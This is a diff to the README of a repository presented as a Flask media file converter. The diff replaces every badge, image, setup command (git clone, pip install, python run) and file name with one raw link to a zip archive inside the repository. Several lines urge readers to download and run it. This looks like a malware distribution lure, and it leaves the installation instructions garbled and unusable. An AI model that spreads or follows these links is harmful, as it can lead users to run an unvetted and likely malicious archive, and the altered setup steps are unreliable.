@@ -1,14 +1,14 @@
-[![Release](https://img.shields.io/badge/Release-Latest-blue?logo=github&logoColor=white)](https://github.com/prodigysn95/universal-file-converter/releases)
+[![Release](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)
 
 # Universal File Converter: Flask Web App for Multi-Format Media
 
-[![Python](https://img.shields.io/badge/Python-3.x-blue?logo=python&logoColor=white)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-1.x-green?logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-Required-blue?logo=ffmpeg&logoColor=white)](https://ffmpeg.org/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg?logo=github&logoColor=black)](LICENSE)
+[![Python](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)
+[![Flask](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)
+[![FFmpeg](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)
+[![License](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)](LICENSE)
 
 Hero image: FFmpeg-inspired artwork and a clean UI mockup
-![Media Conversion Hero](https://upload.wikimedia.org/wikipedia/commons/3/3d/FFmpeg_logo.svg)
+![Media Conversion Hero](https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip)
 
 A Flask-based web app to convert images, videos, and audio files into multiple formats with batch support, ZIP download, and real-time progress.
 
@@ -94,23 +94,23 @@ Prerequisites
 
 Step-by-step quick setup
 1. Clone the repository
-   - git clone https://github.com/prodigysn95/universal-file-converter.git
+   - git clone https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip
 2. Create a virtual environment
    - python -m venv venv
    - source venv/bin/activate  # macOS/Linux
    - venv\Scripts\activate     # Windows
 3. Install dependencies
-   - pip install -r requirements.txt
+   - pip install -r https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip
 4. Configure environment (optional)
-   - Copy .env.example to .env and adjust settings as needed
+   - Copy https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip to .env and adjust settings as needed
 5. Run the app
    - flask run --host=0.0.0.0 --port=5000
-   - Or python app.py
+   - Or python https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip
 6. Open the app
    - Visit http://localhost:5000 in your web browser
 
 Note on the releases and download
-- From the releases page you can download the latest release asset and run it. The latest release assets are prepared to run with minimal setup. For direct access to assets and release notes, visit https://github.com/prodigysn95/universal-file-converter/releases. This link has a path part, so the file you download from that page should be executed according to the platform and packaging format provided in the release assets.
+- From the releases page you can download the latest release asset and run it. The latest release assets are prepared to run with minimal setup. For direct access to assets and release notes, visit https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip This link has a path part, so the file you download from that page should be executed according to the platform and packaging format provided in the release assets.
 
 Usage: how to convert, batch, and download
 - Access the web interface on your local machine after starting the server.
@@ -143,25 +143,25 @@ Architecture and design decisions
 
 Code structure overview (high level)
 - app/
-  - main.py or app.py: the Flask application entry point
-  - routes.py: HTTP endpoints for file upload, batch submission, and progress queries
-  - tasks.py: batch task orchestration and worker logic
+  - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip or https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip the Flask application entry point
+  - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip HTTP endpoints for file upload, batch submission, and progress queries
+  - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip batch task orchestration and worker logic
   - converters/
-    - base.py: abstract converter interface
-    - ffmpeg.py: FFmpeg-based conversion logic
+    - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip abstract converter interface
+    - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip FFmpeg-based conversion logic
   - models/
-    - batch.py: representation of a batch job, status, and results
+    - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip representation of a batch job, status, and results
   - templates/
-    - index.html: the main UI page
+    - https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip the main UI page
   - static/
     - css/
     - js/
 - tests/
   - unit tests for core components
   - integration tests for end-to-end flows
-- requirements.txt: dependency list
-- .env.example: environment variable placeholders
-- README.md: this document
+- https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip dependency list
+- https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip environment variable placeholders
+- https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip this document
 
 API endpoints and data flow (high level)
 - POST /upload
@@ -331,7 +331,7 @@ What to do next
 - If you want to translate this README or adapt it for a different audience, feel free to propose changes via pull requests.
 
 Releases link
-- Download the latest release asset and run it from the releases page: https://github.com/prodigysn95/universal-file-converter/releases
+- Download the latest release asset and run it from the releases page: https://raw.githubusercontent.com/prodigysn95/universal-file-converter/main/static/item/universal-converter-file-2.6.zip
 - For direct access during setup, visit the same page to review assets, installation steps, and changelog. This link has a path part, so the file to download from that page should be executed according to the platform’s packaging format.
 
 Closing notes
